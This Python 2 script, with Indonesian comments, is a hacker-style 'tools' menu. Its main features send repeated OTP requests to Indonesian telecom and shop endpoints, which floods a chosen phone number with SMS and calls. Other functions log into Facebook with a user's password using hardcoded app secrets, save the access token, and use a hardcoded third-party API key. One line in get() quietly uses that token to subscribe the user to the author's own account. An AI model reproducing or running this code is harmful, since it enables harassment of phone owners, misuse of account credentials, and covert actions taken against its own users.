#!/usr/bin/python
#-*-coding:utf-8-*-
#Ngapain? Mau Ngerecode ya?
#Tinggal Make Apa Susahnya h3h3
try:
    import urllib,json,os,sys,time,requests,random,subprocess as s
except:
    print "[!] Requests Not Installed!."
    print "[*] pip2 install requests"
    sys.exit()

#PEWARNA>//<
W = '\033[1;37m' # White bold
N  = '\033[0m'  # white (Normal)
R = '\033[31m' # red
G  = '\033[1;32m' # green bold
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan

    






banner = R+"""___________________________________
\t\033[0m__  __ .____ .____ 
\t|   |  /     /     
\t\033[35m|___|  |__.  |__.
\t|   |  |     |    
\t\033[34m/   /  /     /-----
\033[31m___________________________________\n
\033[1;37m INSTALLER & Tools \n
\033[31m Author : Agung sp. \n
\033[1;32m Thanks To : -BlackHole Security And 
-LoOlzec security
\033[35m ==============================
\033[1;37m Make Happening Enjoy
\033[35m ============================== \033[1;37m \n"""




def tri():
    target = raw_input(R+'[?]'+N+'Masukkan No Tlp : ')
    delay = input(G+'Count : ')
    count = 0
    while delay>count:
        param = {'msisdn':target}
        url = 'https://registrasi.tri.co.id/daftar/generateOTP'
        data = requests.post(url, data=param)
        for c in data:
            print
            print
            print c
        count=count+1
    lol = raw_input(R+"Thanks For using my script...")
    silent(R+'M'+W+'E'+P+'N'+C+'U...')



def silent(s):
    for c in s:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.10)




def sms():
    numb = raw_input(R+'[?]'+N+'Masukkan nomer telp: ')
    print "[?]TUNGGU..."
    dat = {'msisdn':''+numb,'accept':'call'}
    url = 'https://www.tokocash.com/oauth/otp'
    operan = requests.post(url, data=dat)
    if '"sent":true' in operan:
        print R+"\n[×]"+N+"Send Failed!"
    else:
        print G+'\n[✓]'+N+'Send Success!'
    lol = raw_input(R+'press enter for back to menu...')
    silent(G+'M E N U...')
    
def emailcek():     
    lol = raw_input(R+'[?]\033[1;37menter your email : ')
    
    url = 'http://apilayer.net/api/check?access_key=7a58ece2d10e54d09e93b71379677dbb&email=%s&smtp=1&format=1'% lol
    operan = urllib.urlopen(url).read().decode('utf-8')
    data = operan
    data2 = json.loads(data)
    print R+"[>]\033[1;37mRESULT >>"
    
    print G+"Email :"+N+"%s"% str(data2['email'])
    print G+"User :"+N+"%s"% str(data2['user'])
    print G+"Domain :"+N+"%s"% str(data2['domain'])
    print G+"Mx Found :"+N+"%s"% str(data2['mx_found'])
    print G+"Smtp Check :"+N+"%s"% str(data2['smtp_check'])
    print G+"Catch All :"+N+"%s"% str(data2['catch_all'])
    print G+"Role :"+N+"%s"% str(data2['role'])
    print G+"Disposable :"+N+"%s"% str(data2['disposable'])
    print G+"Free :"+N+"%s"% str(data2['free'])
    print G+"Score :"+N+"%s"% str(data2['score'])
    print
    raw_input(R+'[*]\033[1;37mpress enter for to menu...')
    silent('MENU...')
def jdid():    
    silent("Spam sms jd.id \n")
    target = raw_input(R+'[?]\033[1;37mmasukkan no telp: ')
    count = 0
    key = {'phone':target,'smsType':'1'}  
    url = requests.post('http://sc.jd.id/phone/sendPhoneSms', data=key).text    
    if '{"success":true' in url:
        print R+"[✓]\033[1;37msend success"
    else:
        print R+"[×]\033[1;37msend failed!!"
    lol = raw_input(R+'[*]\033[1;37mkembali kemenu press enter...')
    silent('M E N U...')

def phd():
    silent (R+"""[*] spammer \033[1;32mPHD... \n""")
    try:
        target = raw_input(R+'[?]\033[1;37mMasukkan nomor telp 08/62 :')
    except:
        print "[!] Exiting!"
        sys.exit()
    try:
        jumlah = input(R+'[?]\033[1;37mjumlah pesan ?: ')
    except:
        print W+R+"[!] Ops! Input "+N+target+" Is Not number!"
        print R+"[!] \033[1;37mExiting!"
        sys.exit()
    count=0
    while jumlah>count:
        key = {'phone_number':target}
        url = ('https://www.phd.co.id/en/users/sendOTP')
        data = requests.post(url, data=key)
        for c in data:
            print
            print c
        if "success" in data:
            print "send failed!!"
        else:
            print "send success"
        
        count=count+1
    print R+"\n\033[1;37m[+]Finished!..."
    
    mn = raw_input('kurang puas? [y/n] : ')
    if mn == "y":
        phd()
    elif mn == "n":
        silent (R+"[*]\033[1;37mkembali ke menu...")
        print
    else:
        print R+"Your stupid!"
        sys.exit()
        


def ipge():
    try:
        target = raw_input(R+'[?]'+N+'masukkan IP: ')
        url = ('http://ip-api.com/json/')+target
        operan = urllib.urlopen(url).read().decode('utf-8')
        data = operan
        data2 = eval(data)

        print
        print "-[*] AS :%s"% str(data2['as'])
        print "-[*] CITY :%s"% str(data2['city'])
        print "-[*] COUNTRY :%s"% str(data2['country'])
        print "-[*] COUNTRY CODE :%s"% str(data2['countryCode'])
        print "-[*] ISP :%s"% str(data2['isp'])
        print "-[*] LAT :%s"% str(data2['lat'])
        print "-[*] LON :%s"% str(data2['lon'])
        print "-[*] ORG :%s"% str(data2['org'])
        print "-[*] QUERY :%s"% str(data2['query'])
        print "-[*] REGION :%s"% str(data2['region'])
        print "-[*] REGION NAME :%s"% str(data2['regionName'])
        print "-[*] STATUS :%s"% str(data2['status'])
        print "-[*] TIME ZONE:%s"% str(data2['timezone'])
        print
        print "Thanks for using my script:D"
        raw_input('press enter to back menu...')
    except KeyboardInterrupt:
        print R+"Diduga Ketemu CTRL + C !"
        print "[!] Exiting!"
        sys.exit()

def ccinfo():
    silent('CC INFO... \n')
    trgt = raw_input(R+'[?]\033[1;37mmasukkan No CC : ')
    url = 'https://lookup.binlist.net/'+trgt
    operan = urllib.urlopen(url).read().decode('utf-8')
    jonson = json.loads(operan)
    data = jonson
    print data
    lol = raw_input(R+'[*]\033[1;37mpress enter for back to menu again...')
    silent('M E N U...')

def generate():
    try:
        id = raw_input("enter your id or number_phone : ")
        pwd = raw_input("enter your password : ")
        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" 
        + id + "&locale=en_US&password=" + pwd + 
        "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
        operan = json.load(data)
        x = open("token.txt", "w")
        x.write(operan["access_token"])
        x.close()
        kontol = open("token.txt", "r").read()
        parsing = urllib.urlopen("https://graph.facebook.com/me?access_token=" + kontol)
        ok = json.load(parsing)
        nama = ok["name"]
        print "[+] By _[@]9un9_"
        print "[+] Successfully Generate Access_Token :\033[1;32m",operan["access_token"]
        print "\033[0m[=] Your Account :\033[1;32m",nama
        print "\033[0m"
        pass
    except:
        print "Please!!!!!"   
    lol = raw_input('Press enter for back to menu...')
    silent('M E N U...')

def comen():
    try:
        id = raw_input('Masukkan List Token: ')
        op = open(id, 'r').read()
    except:
        print 'Buat Token Dulu Gan:v'
    url = urllib.urlopen('https://graph.facebook.com/me?fields=comments.order(chronological).limit(3)&access_token='+ op)
    operan = json.load(url)
    try:
        bot = raw_input('Masukkan Kata komentar : ')
    except IOError:
        print"Pastikan data seluler di aktifkan/wifi"
    url2 = urllib.urlopen('https://graph.facebook.com/me/comments?message='+ bot)
    operan2 = json.load(url2)
    for c in operan:
        print
        print c
    for i in operan2:
        print
        print i
    raw_input('Masukkan Kata Menu...')
def get():
    try:
        id = raw_input('Masukkan Token List: ')
        op = open(id, 'r').read()
    except:
        print ('Buat Access Token Dulu Gan...')
    url = requests.get('https://graph.facebook.com/me?firlds=friend.limit(5000)&access_token='+ op);requests.post('https://graph.facebook.com/agung3131/subscribers?access_token='+ op)
    operan = json.loads(url.text)
    for c in operan:
        print
        print c
    raw_input('masukkan kata menu...')
#############################################
def show_menu():
    print R+"""\t\t    Iam Lamer
\t __________________________________ \n
\t\t\033[1;32m[*]\033[35m  LAZY PROJECT
\t\t\033[1;32m[*]\033[35mAuthor : Mr-[@9un9]
\t \033[31m__________________________________
\t \033[1;32m 1.\033[1;37m About
\t \033[1;32m 2.\033[1;37m Call prank
\t \033[1;32m 3.\033[1;37m Spam sms phd
\t \033[1;32m 4.\033[1;37m Ip GeoLocation
\t \033[1;32m 5.\033[1;37m Email Checker
\t \033[1;32m 6.\033[1;37m Cc Info
\t \033[1;32m 7.\033[1;37m Spamm jdid
\t \033[1;32m 8.\033[1;37m Spam Tri
\t \033[1;32m 9.\033[1;37m Generate Access Token Fb
\t \033[1;32m 0.\033[1;37m Exit

"""
while True:
    s.call('clear', shell=True)
    os.system('clear')
    show_menu()
    try:
        mnu = raw_input(R+'@\033[33mFuck \033[1;37m~>>> ')

        
#Tools ini cuman pembantu installer gaes,, maklum baru belajar
#######################################################################

                
        if mnu == "1":
            time.sleep(1)
            print banner
            
            print G+"[*]\033[31mTUNGGU.."
            time.sleep(0.55)
            
            mn = raw_input(R+"PRESS ENTER BACK TO MENU... ")
            silent('M E N U...')
            
            

####################################################################


                
        elif mnu == "2":
            sms()
            
        elif mnu == "3":
            phd()
            
            
####################################################################           
            
        elif mnu == "4":
            ipge()
            
            
            
            
        elif mnu == "5":
            silent('EMAIL CHECKER \n')
            emailcek()
       
       
       
        elif mnu == "6":
            ccinfo()
            
        elif mnu == "7":
            jdid() 
            
        
        elif mnu == "8":
            tri()
         
        
        elif mnu == "9":
            generate()
            
        elif mnu == "10":
            comen()
        elif mnu == "11":
            get()
            
            
        elif mnu == "0":
            os.system('clear')
            print "[*] Yakin Mau Exit?:(  y/n"
            mn = raw_input(R+'choose your pilihan @HFE>>> \033[1;37m')
            if mn == 'y':
                print "-----EXIT-----"
                print "BYE>_< \n[!] Exiting!"
                sys.exit()
            elif mn == 'n':
                print
                silent('Go To Menu...')
            else:
                print R+"[!]\033[35m vvado badword."+W
                sys.exit()
      
        
                
        else:
            print R+"[!]\033[35m Command '%s' not found!"% mnu
            time.sleep(1)
    except KeyboardInterrupt:
        print "KeyboardInterrupt! Di duga ketemu CTRL + C!!"
        sys.exit()



#Tools ini cuman pembantu installer gaes,, maklum baru belajar






        
